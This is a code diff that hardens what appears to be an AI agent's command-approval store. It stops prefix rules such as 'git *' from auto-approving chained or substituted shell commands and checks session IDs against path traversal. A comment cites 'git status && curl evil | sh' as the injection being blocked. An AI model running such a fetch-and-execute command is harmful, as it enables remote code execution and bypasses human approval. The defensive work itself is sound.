@@ -11,6 +11,43 @@ export interface ApprovalRule {
 	createdAt: number;
 }
 
+/** Returns true if `cmd` is a single, simple shell command with no unquoted
+ *  control operators or command substitution — i.e. honoring a `prefix *`
+ *  approval rule (e.g. `git *`) for it cannot smuggle in a second command.
+ *
+ *  Quoted regions are respected: literal operators inside quotes are fine
+ *  (`git commit -m "a && b"` stays simple), but command substitution — `$(...)`
+ *  or backticks — is dangerous even inside double quotes, so it is rejected.
+ *  Fails closed: anything ambiguous (unbalanced quotes, redirection, chaining,
+ *  newlines, subshells) returns false, which means the human gate is shown. */
+export function isSimpleSingleCommand(cmd: string): boolean {
+	let inSingle = false, inDouble = false;
+	for (let i = 0; i < cmd.length; i++) {
+		const c = cmd[i];
+		if (inSingle) {
+			if (c === "'") inSingle = false;
+			continue;
+		}
+		if (inDouble) {
+			if (c === '\\') { i++; continue; }                 // backslash escape
+			if (c === '"') { inDouble = false; continue; }
+			if (c === '`') return false;                        // cmd-subst in dquotes
+			if (c === '$' && cmd[i + 1] === '(') return false;  // $(...) in dquotes
+			continue;
+		}
+		// unquoted
+		if (c === '\\') { i++; continue; }
+		if (c === "'") { inSingle = true; continue; }
+		if (c === '"') { inDouble = true; continue; }
+		if (c === '`') return false;
+		if (c === '$' && cmd[i + 1] === '(') return false;
+		if (c === '\n' || c === '\r') return false;
+		if (';|&<>(){}'.includes(c)) return false;
+	}
+	if (inSingle || inDouble) return false;                     // unbalanced quotes
+	return true;
+}
+
 export class RulesStore {
 	private rulesDir: string;
 	private cache = new Map<string, ApprovalRule[]>();
@@ -118,8 +155,13 @@ export class RulesStore {
 				case 'shell': {
 					const base = rule.pattern.replace(/\s+\*$/, '');
 					const cmd = r.fullCommandText?.trim() ?? '';
-					// bare '*' pattern means allow any shell command
-					if (base === '*' || cmd === base || cmd.startsWith(base + ' ')) return rule;
+					// bare '*' pattern means allow any shell command (explicit blanket approval)
+					if (base === '*') return rule;
+					// A prefix rule (e.g. `git *`) must only auto-approve a single simple
+					// command. Reject compound/chained/substituted commands so that
+					// `git status && curl evil | sh` is NOT silently approved by `git *`.
+					if (!isSimpleSingleCommand(cmd)) break;
+					if (cmd === base || cmd.startsWith(base + ' ')) return rule;
 					break;
 				}
 				case 'read':
@@ -163,6 +205,7 @@ export class RulesStore {
 
 	private load(sessionId: string): { rules: ApprovalRule[]; approveAll: boolean } {
 		try {
+			if (!/^[A-Za-z0-9_-]+$/.test(sessionId)) return { rules: [], approveAll: false };
 			const f = path.join(this.rulesDir, `${sessionId}.json`);
 			if (fs.existsSync(f)) {
 				const data = JSON.parse(fs.readFileSync(f, 'utf8'));
@@ -178,6 +221,7 @@ export class RulesStore {
 	}
 
 	private save(sessionId: string, rules: ApprovalRule[], approveAll?: boolean): void {
+		if (!/^[A-Za-z0-9_-]+$/.test(sessionId)) return;
 		const yolo = approveAll ?? this.approveAllCache.get(sessionId) ?? false;
 		try {
 			fs.mkdirSync(this.rulesDir, { recursive: true });
